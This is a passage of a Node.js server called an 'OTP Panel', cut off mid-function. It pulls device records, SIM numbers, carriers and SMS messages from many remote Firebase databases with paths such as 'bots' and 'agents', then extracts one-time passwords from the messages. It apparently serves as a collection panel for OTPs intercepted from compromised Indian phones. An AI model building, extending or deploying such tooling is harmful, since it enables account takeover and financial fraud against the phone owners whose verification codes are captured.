require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const crypto = require('crypto');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const Redis = require('ioredis');
// ============================================================
// OTP PANEL - Railway Optimized (Single File)
// ============================================================
// ==================== CONFIG ====================

const config = {
  // Server
  PORT: process.env.PORT || 3001,

  // Secrets
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  TOKEN_SECRET: process.env.TOKEN_SECRET || crypto.randomBytes(32).toString('hex'),
  ROOT_OWNER_ID: process.env.ROOT_OWNER_ID || '',

  // MongoDB
  MONGODB_URI: process.env.MONGODB_URI || '',

  // Redis (optional but recommended)
  REDIS_URL: process.env.REDIS_URL || '',

  // Turnstile
  TURNSTILE_SECRET_KEY: process.env.TURNSTILE_SECRET_KEY || '',
  TURNSTILE_SITE_KEY: process.env.TURNSTILE_SITE_KEY || '',

  // TTLs
  SESSION_TTL_MS: 60 * 60 * 1000,
  DEVICE_VERIFY_TTL_MS: 24 * 60 * 60 * 1000,
  SERVER_NUMBERS_TTL: 3 * 60 * 1000,
  DASHBOARD_CACHE_TTL: 5000,

  // Cache
  CACHE_TTL: {
    DB_INFO: 15 * 60 * 1000,
    SERVER_COUNTS: 2 * 60 * 1000,
  },

  MAX_CACHE_SIZE: {
    '2': 2000,
    '10': 5000,
    '30': 10000,
    '60': 20000,
    'older': 50000
  },

  // Performance tuning
  AUTO_FETCH: process.env.AUTO_FETCH !== 'false',
  SERVER_CONCURRENCY: parseInt(process.env.SERVER_CONCURRENCY) || 5,
  NUMBER_CONCURRENCY: parseInt(process.env.NUMBER_CONCURRENCY) || 15,
  CACHE_REFRESH_INTERVAL_MS: parseInt(process.env.CACHE_REFRESH_INTERVAL_MS) || 120000,
  FETCH_TIMEOUT: 30000,
  FETCH_RETRIES: 2,
  OTP_FETCH_TIMEOUT: 30000,
  OTP_FETCH_RETRIES: 1,
  CSRF_TTL_MS: 15 * 60 * 1000,

  // Cache builder
  SMS_EXPIRY_MINUTES: 90,
  CACHE_CLEANUP_CHUNK_SIZE: 500,
};


// ==================== UTILITIES ====================

// ==================== REGEX & CONSTANTS ====================
const OTP_REGEX_MAP = {
    '4': /\b\d{4}\b/g,
    '5': /\b\d{5}\b/g,
    '6': /\b\d{6}\b/g,
    '4+5+6': /\b\d{4}\b|\b\d{5}\b|\b\d{6}\b/g,
    'all': /\b\d{4,}\b/g
};

const ERROR_KEYWORDS_SET = new Set([
    'error', 'failed', 'failure', 'unauthorized', 'forbidden', 'not found',
    'invalid', 'expired', 'timeout', 'unable to', 'could not', 'server error',
    'bad request', 'internal error', 'service unavailable', 'maintenance',
    'data usage alert', 'plan expiring', 'recharge now', 'bill payment',
    'spam alert', 'dnd', 'trai', 'usage alert', 'data alert',
    'recharge', 'pack expired', 'validity', 'balance', 'sms quota',
    'data pack', 'top-up', 'valid till', 'plan kh', 'plan khatm',
    'plan expire', 'plan expired', 'low balance', 'insufficient balance'
]);

// ==================== ERROR DETECTION ====================
function isErrorOrSystemMessage(msg) {
    if (!msg || typeof msg !== 'string') return true;
    const lowerMsg = msg.toLowerCase();
    for (const kw of ERROR_KEYWORDS_SET) {
        if (lowerMsg.includes(kw)) return true;
    }
    return false;
}

// ==================== TIMESTAMP PARSING ====================
function parseTimestamp(rawValue) {
    if (!rawValue) return null;

    if (typeof rawValue === 'number') {
        if (rawValue > 1e12) return rawValue;
        if (rawValue > 1e9) return rawValue * 1000;
        return rawValue;
    }

    if (typeof rawValue === 'string') {
        const trimmed = rawValue.trim();
        if (!trimmed) return null;

        // Indian format with AM/PM
        if (/AM|PM/i.test(trimmed)) {
            const d = new Date(trimmed);
            if (!isNaN(d.getTime())) return d.getTime();

            const match = trimmed.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[,\s]+(\d{1,2}):(\d{2}):(\d{2})\s*(AM|PM)?/i);
            if (match) {
                let [, day, month, year, hour, min, sec, ampm] = match;
                hour = parseInt(hour, 10);
                if (ampm) {
                    const meridian = ampm.toUpperCase();
                    if (meridian === 'PM' && hour !== 12) hour += 12;
                    if (meridian === 'AM' && hour === 12) hour = 0;
                }
                const d2 = new Date(parseInt(year, 10), parseInt(month, 10) - 1, parseInt(day, 10), hour, parseInt(min, 10), parseInt(sec, 10));
                if (!isNaN(d2.getTime())) return d2.getTime();
            }
            return null;
        }

        // ISO 8601
        if (trimmed.includes('T') || trimmed.includes('Z')) {
            const d = new Date(trimmed);
            if (!isNaN(d.getTime())) return d.getTime();
        }

        // Firebase/Android common format: dd/mm/yyyy | hh:mm[:ss] am/pm
        const fbMatch = trimmed.match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{2,4})(?:\s*\|?\s+)(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?$/i);
        if (fbMatch) {
            let [, day, month, year, hour, minute, second, meridian] = fbMatch;
            year = Number(year); if (year < 100) year += 2000;
            hour = Number(hour); minute = Number(minute); second = Number(second || 0);
            if (meridian) { if (meridian.toLowerCase() === 'pm' && hour !== 12) hour += 12; if (meridian.toLowerCase() === 'am' && hour === 12) hour = 0; }
            const local = new Date(year, Number(month)-1, Number(day), hour, minute, second);
            if (!isNaN(local.getTime())) return local.getTime();
        }

        // Date-only
        if (trimmed.includes('-') || trimmed.includes('/')) {
            const d = new Date(trimmed);
            if (!isNaN(d.getTime())) return d.getTime();

            const match2 = trimmed.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})/);
            if (match2) {
                const [, day, month, year] = match2;
                const d2 = new Date(parseInt(year, 10), parseInt(month, 10) - 1, parseInt(day, 10));
                if (!isNaN(d2.getTime())) return d2.getTime();
            }
        }

        // Numeric string (Unix timestamp)
        const parsed = parseInt(trimmed, 10);
        if (!isNaN(parsed)) {
            if (parsed > 1e12) return parsed;
            if (parsed > 1e9) return parsed * 1000;
            return parsed;
        }
    }

    return null;
}

// ==================== OTP EXTRACTION ====================
// ==================== SMS PHONE FALLBACK ====================
// Ordered patterns are intentional: return only the first correctly matched number.
const SMS_PHONE_PATTERNS = [
    /(?:Jio|Airtel|Vi|Vodafone|Idea|BSNL|MTNL|Docomo|Tata|Reliance|Telenor|Uninor|Videocon)\s+(?:Number|नंबर|Nambhar|नम्बर|No\.?|Num)\s*[:\-]\s*(\+?91[-\s]?[6-9]\d{9}|[6-9]\d{9})/i,
    /(?:नंबर|नम्बर)\s*[:\-]\s*(\+?91[-\s]?[6-9]\d{9}|[6-9]\d{9})/i,
    /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]?\s*(\+?91[-\s]?[6-9]\d{9}|[6-9]\d{9})/i,
    /(?:registered\s+(?:mobile\s+)?)?(?:number|phone|mobile)\s*[:\-]\s*(\+?91[-\s]?[6-9]\d{9}|[6-9]\d{9})/i,
    /(\+91[-\s]?[6-9]\d{9})/i,
    /(?:\b91)([6-9]\d{9})\b/,
    /(?:^|\s|:)([6-9]\d{9})(?:\s|$|\.)/
];
function extractFirstPhoneFromSms(text) {
    const source = String(text || '');
    for (const pattern of SMS_PHONE_PATTERNS) {
        const match = source.match(pattern);
        if (!match || !match[1]) continue;
        const digits = String(match[1]).replace(/\D/g, '');
        const mobile = digits.length === 12 && digits.startsWith('91') ? digits.slice(2) : digits;
        if (/^[6-9]\d{9}$/.test(mobile)) return mobile;
    }
    return null;
}

function extractOtpFromMessage(text, otpLength = 'all') {
    if (!text) return null;
    const msg = typeof text === 'object' ? JSON.stringify(text) : String(text);

    let match = msg.match(/(?:otp|code|pin)\s*(?:is|[:\-=])\s*(\d{4,8})/i);
    if (match) return match[1];

    match = msg.match(/(?:verification\s+code|security\s+code|access\s+code|confirmation\s+code)\s*(?:is|[:\-=])\s*(\d{4,8})/i);
    if (match) return match[1];

    match = msg.match(/(\d{4,8})\s*(?:is\s+(?:your\s+)?(?:otp|code|pin))/i);
    if (match) return match[1];

    match = msg.match(/(?:one[-\s]?time\s+(?:password|pin)|one\s+time\s+(?:password|pin))\s*(?:is|[:\-=])\s*(\d{4,8})/i);
    if (match) return match[1];

    const pattern = OTP_REGEX_MAP[otpLength] || OTP_REGEX_MAP['all'];
    pattern.lastIndex = 0;
    const regexMatch = pattern.exec(msg);
    if (regexMatch) {
        const otp = regexMatch[0];
        if (otp.length >= 4 && otp.length <= 8 && !/^20\d{2}$/.test(otp)) {
            return otp;
        }
    }

    return null;
}

// ==================== PHONE VALIDATION ====================
function validatePhoneNumber(raw) {
    if (!raw) return '';
    const str = String(raw).trim();
    let cleaned = str.replace(/^\+91/, '').replace(/^\+/, '').replace(/[\s\-]/g, '');
    if (cleaned.startsWith('91') && cleaned.length === 12) cleaned = cleaned.substring(2);
    if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
    const digits = cleaned.replace(/\D/g, '');
    if (/^\d{10}$/.test(digits)) return digits;
    return '';
}

// ==================== SMS HELPERS ====================
function hasMeaningfulSmsContent(msg) {
    if (!msg) return false;
    const textFields = ['body', 'message', 'text', 'content', 'sms_text', 'msg'];
    for (const field of textFields) {
        if (msg[field] && String(msg[field]).trim().length > 0) return true;
    }
    if (msg.otp && String(msg.otp).trim().length > 0) return true;
    if (msg.otp_1 && String(msg.otp_1).trim().length > 0) return true;
    return false;
}

function getSmsTimestampUtc(msg) {
    if (!msg) return null;
    const timeFields = [
        'time', 'date', 'timestamp', 'created_at', 'createdAt',
        'sent_time', 'sentTime', 'received_time', 'receivedTime',
        'msg_time', 'msgTime', 'datetime', 'date_time',
        'utc_time', 'ist_time', 'local_time', 'date_value',
        'sort_timestamp'
    ];
    for (const field of timeFields) {
        if (msg[field] != null) {
            const rawVal = typeof msg[field] === 'object' ? JSON.stringify(msg[field]) : msg[field];
            const utcMs = parseTimestamp(rawVal);
            if (utcMs !== null) return utcMs;
            // FIX: Fallback to Firebase date parser for formats like "dd/mm/yyyy | hh:mm am/pm"
            const fbMs = fbDateValue(rawVal);
            if (fbMs !== null && fbMs > 0) return fbMs;
        }
    }
    return null;
}

function getSmsDisplayTime(msg) {
    if (!msg) return null;
    const timeFields = [
        'time', 'date', 'timestamp', 'created_at', 'createdAt',
        'sent_time', 'sentTime', 'received_time', 'receivedTime',
        'msg_time', 'msgTime', 'datetime', 'date_time',
        'utc_time', 'ist_time', 'local_time', 'date_formatted'
    ];
    for (const field of timeFields) {
        if (msg[field] != null) {
            const val = typeof msg[field] === 'object' ? JSON.stringify(msg[field]) : String(msg[field]).trim();
            if (!val || val === '[object Object]') continue;
            if (/^\d+$/.test(val) && val.length >= 10) {
                const utcMs = parseTimestamp(val);
                if (utcMs !== null) return formatIndianTime(utcMs);
            }
            const parsedDisplayMs = parseTimestamp(val);
            if (parsedDisplayMs !== null) return formatIndianTime(parsedDisplayMs);
            return val;
        }
    }
    return null;
}

// ==================== TIME FORMATTING ====================
function formatIndianTime(utcMs) {
    if (!utcMs || utcMs <= 0) return null;
    const d = new Date(utcMs);
    if (isNaN(d.getTime())) return null;
    const istOffsetMs = 5.5 * 60 * 60 * 1000;
    const istDate = new Date(d.getTime() + istOffsetMs);
    const day = String(istDate.getUTCDate()).padStart(2, '0');
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
    const month = months[istDate.getUTCMonth()];
    let hours = istDate.getUTCHours();
    const minutes = String(istDate.getUTCMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    const hoursStr = String(hours).padStart(2, '0');
    return `${day} ${month}, ${hoursStr}:${minutes} ${ampm}`;
}

// ==================== CRYPTO HELPERS ====================
function generateCsrf() {
    return crypto.randomBytes(16).toString('hex');
}

function generateToken(userId, csrf, secret, ttl) {
    const ts = Date.now();
    const payload = Buffer.from(JSON.stringify({ uid: userId, csrf, csrfTs: ts, ts })).toString('base64');
    const sig = crypto.createHmac('sha256', secret).update(payload).digest('hex');
    return payload + '.' + sig;
}

function verifyToken(token, secret, ttl) {
    try {
        const [payload, sig] = token.split('.');
        if (!payload || !sig) return null;
        const check = crypto.createHmac('sha256', secret).update(payload).digest('hex');
        if (check !== sig) return null;
        const data = JSON.parse(Buffer.from(payload, 'base64').toString());
        if (Date.now() - data.ts > ttl) return null;
        return data;
    } catch { return null; }
}

function verifyTelegramInitData(initData, botToken) {
    try {
        const params = new URLSearchParams(initData);
        const hash = params.get('hash');
        if (!hash) return null;
        params.delete('hash');
        const sorted = Array.from(params.entries()).sort(([a], [b]) => a.localeCompare(b));
        const dataCheckString = sorted.map(([k, v]) => `${k}=${v}`).join('\n');
        const secretKey = crypto.createHmac('sha256', 'WebAppData').update(botToken).digest();
        const checkHash = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');
        if (checkHash !== hash) return null;
        const userJson = params.get('user');
        return userJson ? JSON.parse(userJson) : null;
    } catch {
        return null;
    }
}

// ==================== DATA PARSERS ====================
function countNumbersFromData(data) {
    if (!data) return 0;
    if (Array.isArray(data)) return data.length;
    if (data.numbers && Array.isArray(data.numbers)) return data.numbers.length;
    if (data.devices && Array.isArray(data.devices)) return data.devices.length;
    if (data.servers) {
        let count = 0;
        const srvs = data.servers;
        for (const k in srvs) {
            const sv = srvs[k];
            if (sv && sv.devices && Array.isArray(sv.devices)) count += sv.devices.length;
        }
        return count;
    }
    if (data.count) return data.count;
    if (data.number || data.phone) return 1;
    return 0;
}

function extractServerKeyNumber(serverKeyStr) {
    if (!serverKeyStr) return '';
    const str = String(serverKeyStr).trim();
    if (/^\d+$/.test(str)) return str;
    const match = str.match(/(\d+)$/);
    if (match) return match[1];
    return '';
}

// ==================== OTP FETCH PARAMETER HELPERS ====================
function otpUrlUsesDeviceId(otpFetchUrl) {
    return typeof otpFetchUrl === 'string' && /\{deviceid\}/i.test(otpFetchUrl);
}

function buildOtpFetchUrl(server, values) {
    if (!server || !server.otpFetchUrl) return { url: null, mode: 'number', reason: 'OTP URL missing' };
    const number = values && values.number ? String(values.number) : '';
    const deviceId = values && (values.deviceId || values.device_id) ? String(values.deviceId || values.device_id) : '';
    const serverKey = values && values.serverKey ? String(values.serverKey) : String(server.serverKey || server.serverId || '');
    const usesDeviceId = otpUrlUsesDeviceId(server.otpFetchUrl);
    if (usesDeviceId && !deviceId) return { url: null, mode: 'deviceid', reason: 'Device ID missing for deviceId-based OTP API' };

    let url = String(server.otpFetchUrl);
    if (usesDeviceId) url = url.replace(/\{deviceid\}/gi, encodeURIComponent(deviceId));
    else url = url.replace(/\{number\}/gi, encodeURIComponent(number));
    url = url.replace(/\{serverid\}/gi, encodeURIComponent(serverKey)).replace(/\{serverkey\}/gi, encodeURIComponent(serverKey));
    return { url, mode: usesDeviceId ? 'deviceid' : 'number', parameter: usesDeviceId ? deviceId : number };
}

function parseNumbersFromData(data, serverName, serverId, fallbackServerKey) {
    const nums = [];
    if (!data) return nums;

    const processItem = (item, extractedServerKey) => {
        const rawNum = String(item.number || item.phone || '');
        const validNum = validatePhoneNumber(rawNum);
        if (!validNum) return null;

        let finalServerKey = extractedServerKey || item.server || item.serverKey || fallbackServerKey;
        finalServerKey = extractServerKeyNumber(finalServerKey) || finalServerKey;

        return {
            ...item,
            number: validNum,
            rawNumber: rawNum,
            sourceKeys: Object.keys(item),
            status: item.online ? 'Online' : (item.status || 'Offline'),
            server: serverName,
            serverId: serverId,
            serverKey: finalServerKey,
            deviceName: item.device_name || item.name || item.deviceName || serverName,
            battery: item.battery ? String(item.battery).replace(/%/g, '').trim() : null,
            operator: item.operator || null,
            deviceId: item.device_id || null,
            device_id: item.device_id || null
        };
    };

    if (data.servers) {
        Object.entries(data.servers).forEach(([responseServerKey, sv]) => {
            if (sv.devices && Array.isArray(sv.devices)) {
                sv.devices.forEach(d => {
                    const n = processItem(d, responseServerKey);
                    if (n) nums.push(n);
                });
            }
        });
    } else if (data.devices && Array.isArray(data.devices)) {
        data.devices.forEach(d => {
            const n = processItem(d, null);
            if (n) nums.push(n);
        });
    } else if (data.numbers && Array.isArray(data.numbers)) {
        data.numbers.forEach(n => {
            const extractedKey = n.server || null;
            const item = processItem(n, extractedKey);
            if (item) nums.push(item);
        });
    } else if (Array.isArray(data)) {
        data.forEach(n => {
            const extractedKey = n.server || null;
            const item = processItem(n, extractedKey);
            if (item) nums.push(item);
        });
    } else if (data.number || data.phone) {
        const extractedKey = data.server || null;
        const item = processItem(data, extractedKey);
        if (item) nums.push(item);
    }
    return nums;
}

// ==================== CONCURRENCY HELPER ====================
async function batchProcess(items, batchSize, processor) {
    if (!Array.isArray(items) || items.length === 0) return [];
    const workerCount = Math.max(1, Math.min(Number(batchSize) || 1, items.length));
    const results = new Array(items.length);
    let nextIndex = 0;
    async function worker() {
        while (true) {
            const index = nextIndex++;
            if (index >= items.length) return;
            try {
                results[index] = { status: 'fulfilled', value: await processor(items[index], index) };
            } catch (reason) {
                results[index] = { status: 'rejected', reason };
            }
        }
    }
    await Promise.all(Array.from({ length: workerCount }, worker));
    return results;
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

// ==================== SERVER-SPECIFIC CACHE CLEANUP ====================
function clearServerCache(serverId) {
    for (const tier of ['2', '10', '30', '60', 'older']) {
        const cacheMap = cache.memory.recentCache[tier];
        const keysToDelete = [];
        for (const [key, entry] of cacheMap) {
            if (entry && entry.serverId === serverId) {
                keysToDelete.push(key);
            }
        }
        for (const key of keysToDelete) {
            cacheMap.delete(key);
        }
    }
    // Also clear SMS notifications for this server
    const notifCache = cache.getSmsNotifications();
    const notifKeysToDelete = [];
    for (const [key, entry] of notifCache) {
        if (entry && entry.serverId === serverId) {
            notifKeysToDelete.push(key);
        }
    }
    for (const key of notifKeysToDelete) {
        notifCache.delete(key);
    }
    // Clear server numbers cache
    cache.memory.serverNumbers.delete(serverId);
}




// ==================== WORKER FIREBASE INTEGRATION (IMPROVED v2) ====================
// Direct Firebase REST support ported from the worker and enhanced for multiple
// Firebase servers. Existing URL-backed servers remain supported.
// Firebase-backed servers are preferred when firebaseDbId/firebase_db_id is configured.

const FB_DEVICE_PATH_KEYS = ['All_User', 'all_user', 'All_Users', 'bots', 'devices', 'users', 'clients', 'agents'];
const FB_MESSAGE_PATH_KEYS = ['messages', 'sms', 'user_sms', 'allMessages', 'inbox', 'logs', 'message', 'msg'];
const FB_BODY_KEYS = ['body', 'message', 'text', 'msg', 'content', 'sms', 'desc'];
const FB_SENDER_KEYS = ['address', 'sender', 'from', 'to', 'phone', 'number', 'mobile', 'mobNo', 'senderNumber', 'senderName', 'title', 'ph'];
const FB_TIME_KEYS = ['timestamp', 'time', 'date', 'createdAt', 'receivedAt', 'msgTime', 'times', 'pushTime', 'dateTime', 'lastSeen', 'last_seen', 'lastOnline', 'last_online', 'lastActive', 'last_active', 'updatedAt', 'updated_at'];
const FB_PHONE_KEYS = ['mobNo', 'mobileNumber', 'phoneNumber', 'mobile', 'phone', 'number', 'mno', 'contact', 'sim', 'sim1', 'sim2', 'simNo', 'simNumber', 'numberSim1', 'numberSim2', 'sim1Number', 'sim2Number', 'contactNumber', 'whatsapp', 'whatsApp' ,'customPh'];
const FB_ONLINE_KEYS = ['online', 'isOnline', 'active', 'is_active', 'on_off', 'state', 'status', 'Status'];
const FB_SIM_KEYS = ['sims', 'simInfo', 'sim_data', 'simDetails', 'SimINFO'];
const FB_SIM_NUMBER_KEYS = ['number', 'phoneNumber', 'mobile', 'mobNo', 'simNumber', 'phone', 'mobileNumber', 'sim1', 'sim2'];
const FB_SIM_CARRIER_KEYS = ['carrier', 'operator', 'network', 'serviceProvider', 'provider', 'opName', 'name', 'sim1Name', 'sim2Name', 'nameSim1', 'nameSim2'];
const FB_NAME_KEYS = ['name', 'modelName', 'model', 'deviceName', 'DeviceModel', 'brand', 'device', 'nick', 'userName', 'username', 'd_name', 'Device_Name'];
const FB_DEVICE_NESTED_CANDIDATES = ['Data/DeviceInfo', 'Data/simDetails', 'simDetails', 'DeviceInfo'];
const FB_SIM_DETAIL_FALLBACKS = [
    'simDetails/{dev}', 'Data/simDetails/{dev}', 'All_Users/simDetails/{dev}',
    'All_Users/Data/simDetails/{dev}', 'All_User/simDetails/{dev}', 'All_User/Data/simDetails/{dev}'
];
const FB_INVALID = new Set(['not available', 'no data', 'no sim found', 'unknown', 'null', 'undefined', 'n/a']);
const MAX_FIREBASE_RESPONSE_BYTES = 16 * 1024 * 1024;
const firebaseInFlight = new Map();

class FirebaseFetchError extends Error {
    constructor(message, details = {}) {
        super(message);
        this.name = 'FirebaseFetchError';
        Object.assign(this, details);
    }
}

function fbObj(value) { return value && typeof value === 'object' && !Array.isArray(value) ? value : {}; }
function fbArr(value) { return Array.isArray(value) ? value : (value && typeof value === 'object' ? Object.values(value).filter(v => v && typeof v === 'object') : []); }
function fbFirst(record, ...keys) {
    const obj = fbObj(record);
    for (const key of keys) if (obj[key] !== undefined && obj[key] !== null && String(obj[key]).trim() !== '') return obj[key];
    return '';
}

/** Extract only string/number primitives; safely unwrap common nested text objects. */
function fbFirstString(record, ...keys) {
    const obj = fbObj(record);
    for (const key of keys) {
        const val = obj[key];
        if (val == null) continue;
        const t = typeof val;
        if (t === 'string') return val;
        if (t === 'number') return String(val);
        if (t === 'object') {
            if (typeof val.text === 'string') return val.text;
            if (typeof val.message === 'string') return val.message;
            if (typeof val.content === 'string') return val.content;
            if (typeof val.body === 'string') return val.body;
        }
    }
    return '';
}
function fbDigits(value) { return String(value ?? '').replace(/\D/g, ''); }
function fbMobile(value) {
    let digits = fbDigits(value);
    if (digits.length === 12 && digits.startsWith('91')) digits = digits.slice(2);
    if (digits.length === 11 && digits.startsWith('0')) digits = digits.slice(1);
    return /^[6-9]\d{9}$/.test(digits) ? digits : '';
}
function fbClean(value) { return fbMobile(value) || fbDigits(value); }
function fbValueUsable(value) { const text = String(value ?? '').trim(); return text && !FB_INVALID.has(text.toLowerCase()); }
function fbPrimaryPhone(sims, phones) {
    // Worker-matching logic: SIM 1 is primary. If SIM 1 missing, fallback to first phone.
    const sim1 = (sims || []).find(s => s.slot === '1' && s.number);
    if (sim1 && sim1.number) return sim1.number;
    return (phones || [])[0] || '';
}
function fbJoinPath(...parts) { return parts.flatMap(part => String(part ?? '').split('/')).map(part => part.trim()).filter(Boolean).join('/'); }
function fbEncodePath(value) { return String(value ?? '').split('/').filter(Boolean).map(x => encodeURIComponent(x)).join('/'); }

function fbReference(dbId) {
    const original = String(dbId ?? '').trim();
    if (!original) return { baseUrl: '', basePath: '' };
    if (!/^https?:\/\//i.test(original) && !/(firebaseio\.com|firebasedatabase\.app)/i.test(original) && !original.includes('/')) return { baseUrl: `https://${original}.firebaseio.com`, basePath: '' };
    const raw = /^https?:\/\//i.test(original) ? original : `https://${original}`;
    try {
        const url = new URL(raw);
        const host = url.hostname.toLowerCase();
        if (!host.endsWith('.firebaseio.com') && !host.endsWith('.firebasedatabase.app') && host !== 'firebaseio.com') return { baseUrl: raw.replace(/\/$/, ''), basePath: '' };
        const basePath = decodeURIComponent(url.pathname).split('/').filter(Boolean).filter(x => x !== '.json').join('/');
        return { baseUrl: `https://${host}`, basePath };
    } catch { return { baseUrl: raw.replace(/\/$/, ''), basePath: '' }; }
}

function fbUrl(dbId, pathName = '', authKey = null, query = '') {
    const ref = fbReference(dbId);
    const url = `${ref.baseUrl}/${fbEncodePath(fbJoinPath(ref.basePath, pathName))}.json`;
    const params = new URLSearchParams();
    for (const source of [authKey, query]) {
        if (!source) continue;
        for (const pair of String(source).replace(/^\?/, '').split('&')) {
            if (!pair) continue;
            const [key, ...rest] = pair.split('=');
            if (key) params.set(key, rest.join('=') || '');
        }
    }
    const qs = params.toString();
    return qs ? `${url}?${qs}` : url;
}

async function fbFetch(dbId, pathName = '', authKey = null, query = '', timeout = 5000, retries = 2, options = {}) {
    if (!dbId) return null;
    const swallow = options === true || Boolean(options && options.swallow);
    const url = fbUrl(dbId, pathName, authKey, query);
    const requestKey = `${url}|${timeout}|${retries}`;
    if (firebaseInFlight.has(requestKey)) {
        try { return await firebaseInFlight.get(requestKey); }
        catch (e) { if (swallow) return null; throw e; }
    }

    const request = (async () => {
        let lastError;
        for (let attempt = 0; attempt < Math.max(1, retries); attempt++) {
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), timeout);
            try {
                const response = await fetch(url, {
                    signal: controller.signal,
                    headers: { Accept: 'application/json', 'User-Agent': 'OTP-Panel-Firebase/1.0' }
                });
                clearTimeout(timer);
                if (response.status === 404) return null;
                if (response.status === 401 || response.status === 403) {
                    throw new FirebaseFetchError(`Firebase HTTP ${response.status} at ${pathName || '/'}`, { status: response.status, dbId, path: pathName, url });
                }
                if (!response.ok) throw new FirebaseFetchError(`Firebase HTTP ${response.status} at ${pathName || '/'}`, { status: response.status, dbId, path: pathName, url });
                const contentLength = Number(response.headers.get('content-length') || 0);
                if (contentLength > MAX_FIREBASE_RESPONSE_BYTES) throw new FirebaseFetchError(`Firebase response too large at ${pathName || '/'}`, { status: response.status, dbId, path: pathName, url });
                const text = await response.text();
                if (text.length > MAX_FIREBASE_RESPONSE_BYTES) throw new FirebaseFetchError(`Firebase response too large at ${pathName || '/'}`, { status: response.status, dbId, path: pathName, url });
                if (!text.trim() || text.trim() === 'null') return null;
                try { return JSON.parse(text); }
                catch { throw new FirebaseFetchError(`Invalid JSON from Firebase at ${pathName || '/'}`, { status: response.status, dbId, path: pathName, url }); }
            } catch (e) {
                clearTimeout(timer);
                lastError = e instanceof FirebaseFetchError
                    ? e
                    : new FirebaseFetchError(`${e?.name === 'AbortError' ? 'Firebase request timed out' : (e?.message || 'Firebase request failed')} at ${pathName || '/'}`, { cause: e, dbId, path: pathName, url });
                if (attempt < retries - 1) await sleep(200 * (attempt + 1));
            }
        }
        throw lastError || new FirebaseFetchError(`Firebase request failed at ${pathName || '/'}`, { dbId, path: pathName, url });
    })();

    firebaseInFlight.set(requestKey, request);
    try { return await request; }
    catch (e) { if (swallow) return null; throw e; }
    finally { firebaseInFlight.delete(requestKey); }
}

async function fbFetchOptional(dbId, pathName = '', authKey = null, query = '', timeout = 3000, retries = 1) {
    return fbFetch(dbId, pathName, authKey, query, timeout, retries, { swallow: true });
}

function fbPhones(record, depth = 0, found = []) {
    const obj = fbObj(record);
    for (const key of FB_PHONE_KEYS) {
        const value = obj[key];
        if (value && typeof value === 'object') {
            fbPhones(value, depth + 1, found);
        } else {
            const phone = fbMobile(value);
            if (phone && !found.includes(phone)) found.push(phone);
        }
    }
    // Do not stop after the first phone: dual-SIM devices must expose both numbers.
    if (depth >= 5) return found;
    for (const value of Object.values(obj)) {
        if (!value || typeof value !== 'object') continue;
        fbPhones(value, depth + 1, found);
    }
    return found;
}

function fbSimSlot(value, fallback) {
    const text = String(value ?? '').toLowerCase();
    const match = text.match(/(?:sim|slot)[_\s-]*(\d+)/i);
    return match ? String(Number(match[1])) : String(value || fallback);
}

function fbSims(record) {
    const obj = fbObj(record), collected = [];
    const add = (value, fallbackSlot) => {
        if (value == null) return;
        if (typeof value === 'string' || typeof value === 'number') {
            const text = String(value).trim();
            const number = fbMobile(text.split(/\s+-\s+/)[0]);
            if (number) collected.push({ slot: String(fallbackSlot), number, carrier: text.includes(' - ') ? text.split(/\s+-\s+/).slice(1).join(' - ').trim() : '' });
            return;
        }
        if (Array.isArray(value)) return value.forEach((item, index) => add(item, index + 1));
        const row = fbObj(value);
        const directNumber = fbMobile(fbFirst(row, ...FB_SIM_NUMBER_KEYS));
        if (directNumber) {
            collected.push({
                slot: fbSimSlot(fbFirst(row, 'slot', 'simSlot', 'id', 'sim'), fallbackSlot),
                number: directNumber,
                carrier: String(fbFirst(row, ...FB_SIM_CARRIER_KEYS) || '')
            });
            return;
        }
        for (const [key, child] of Object.entries(row)) add(child, fbSimSlot(key, fallbackSlot));
    };

    // Parse every configured SIM container, including object maps such as sim1/sim2.
    for (const key of FB_SIM_KEYS) if (obj[key] != null) add(obj[key], 1);
    // Also support legacy flat fields and direct SIMINFO-style keys.
    for (const slot of ['1', '2']) {
        const number = fbMobile(fbFirst(obj, `sim${slot}Number`, `numberSim${slot}`, `sim${slot}`));
        const carrier = String(fbFirst(obj, `nameSim${slot}`, `sim${slot}Name`, `sim${slot}Carrier`, `operator${slot}`) || '');
        if (number) collected.push({ slot, number, carrier });
    }
    const seen = new Set();
    return collected.filter(sim => {
        if (!sim.number) return false;
        const key = `${sim.slot}|${sim.number}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    }).sort((a, b) => Number(a.slot) - Number(b.slot));
}

function fbStatus(record) {
    const value = fbFirst(record, ...FB_ONLINE_KEYS);
    if (typeof value === 'boolean') return { online: value, status: value ? 'online' : 'offline' };
    const normalized = String(value ?? '').trim().toLowerCase();
    if (['1', 'true', 'yes', 'online', 'active', 'on', 'y'].includes(normalized)) return { online: true, status: 'online' };
    if (['0', 'false', 'no', 'offline', 'off', 'n', 'inactive', 'deactive'].includes(normalized)) return { online: false, status: 'offline' };
    return { online: null, status: 'unknown' };
}

function fbParseDevice(key, raw, firebasePath = '') {
    const record = fbObj(raw);
    if (!Object.keys(record).length) return null;
    const phones = fbPhones(record);
    const sims = fbSims(record);
    for (const sim of sims) if (sim.number && !phones.includes(sim.number)) phones.push(sim.number);
    if (!phones.length) return null;
    const status = fbStatus(record);
    const battery = Math.max(0, Math.min(100, Number.parseInt(String(fbFirst(record, 'battery', 'battery_level', 'batteryLevel') || '0'), 10) || 0));
    return {
        device_id: String(key),
        name: String(fbFirst(record, ...FB_NAME_KEYS) || key || 'Device'),
        status: status.status,
        online: status.online,
        phone: fbPrimaryPhone(sims, phones),
        phones,
        sims,
